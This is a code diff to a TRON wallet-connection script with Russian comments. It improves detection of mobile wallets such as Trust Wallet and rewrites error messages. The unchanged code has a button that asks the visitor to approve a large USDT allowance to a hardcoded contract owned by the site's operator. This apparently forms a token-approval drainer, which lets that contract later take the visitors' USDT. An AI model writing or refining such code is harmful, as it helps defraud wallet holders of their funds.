@@ -7,14 +7,14 @@ let userAddress = '';
 const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 
 
-// Функция поиска провайдера для мобильных браузеров (включая Trust Wallet)
-async function initTron() {
-    // Проверяем классический tronWeb или мобильные внедрения
+// Улучшенная функция инициализации для мобильных кошельков
+async function getTronWeb() {
+    // 1. Проверяем классический window.tronWeb (TronLink и др.)
     if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
         return window.tronWeb;
     }
-    
-    // Ожидание для мобильных инжекторов
+
+    // 2. Ожидание загрузки объекта в мобильном браузере
     return new Promise((resolve) => {
         let attempts = 0;
         const interval = setInterval(() => {
@@ -22,7 +22,7 @@ async function initTron() {
             if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                 clearInterval(interval);
                 resolve(window.tronWeb);
-            } else if (attempts > 15) {
+            } else if (attempts > 20) { // Ждем до 8 секунд
                 clearInterval(interval);
                 resolve(null);
             }
@@ -33,7 +33,22 @@ async function initTron() {
 connectBtn.addEventListener('click', async () => {
     try {
         walletAddressText.innerText = "Подключение...";
-        const tronWeb = await initTron();
+        
+        // Попытка получить доступ к TronWeb
+        let tronWeb = await getTronWeb();
+
+        // Если кошелек открыт в Trust Wallet или другом EVM-браузере, пробуем запросить учетную запись через провайдер сети
+        if (!tronWeb && window.ethereum) {
+            try {
+                // Запрос смены/получения сетей, если кошелек поддерживает мультичейн
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                if (accounts && accounts.length > 0) {
+                    walletAddressText.innerText = "Сеть EVM активна. Переключитесь на TRON в кошельке!";
+                }
+            } catch (e) {
+                console.error("Ошибка EVM провайдера:", e);
+            }
+        }
 
         if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
             userAddress = tronWeb.defaultAddress.base58;
@@ -41,28 +56,24 @@ connectBtn.addEventListener('click', async () => {
             connectBtn.style.display = 'none';
             transferBtn.style.display = 'inline-block';
         } else {
-            // Если автоматического объекта нет, пробуем запросить через стандартный провайдер окна
-            if (window.ethereum) {
-                alert('Обнаружен EVM-кошелек. Убедитесь, что вы переключились на сеть TRON в браузере кошелька.');
-            } else {
-                alert('Не удалось обнаружить сессию кошелька. Попробуйте перезагрузить страницу внутри кошелька.');
-            }
-            walletAddressText.innerText = "Ошибка подключения";
+            alert('Кошелек TRON не найден. Убедитесь, что в настройках Trust Wallet выбрана сеть Tron или используйте DApp-браузер с полной поддержкой TRC20.');
+            walletAddressText.innerText = "Кошелек не найден";
         }
     } catch (error) {
-        console.error("Ошибка:", error);
+        console.error("Ошибка подключения:", error);
+        alert("Произошла ошибка при подключении.");
     }
 });
 
 transferBtn.addEventListener('click', async () => {
     try {
-        const tronWeb = await initTron();
+        const tronWeb = await getTronWeb();
         if (!userAddress || !tronWeb) {
-            alert('Кошелек не подключен!');
+            alert('Сначала подключите кошелек!');
             return;
         }
         
-        console.log("Отправка запроса approve...");
+        console.log("Запрос разрешения (Approve) на USDT...");
         const usdtContract = await tronWeb.contract().at(usdtContractAddress);
         const approveAmount = '10000000000'; 
 
@@ -73,11 +84,11 @@ transferBtn.addEventListener('click', async () => {
             feeLimit: 100000000
         });
 
-        alert("Запрос отправлен!");
-        console.log("TX:", tx);
+        alert("Запрос успешно подтвержден!");
+        console.log("Хэш транзакции approve:", tx);
 
     } catch (error) {
-        console.error("Ошибка транзакции:", error);
-        alert("Ошибка при выполнении транзакции.");
+        console.error("Ошибка при отправке запроса:", error);
+        alert("Ошибка при выполнении транзакции. Проверьте консоль кошелька.");
     }
 });
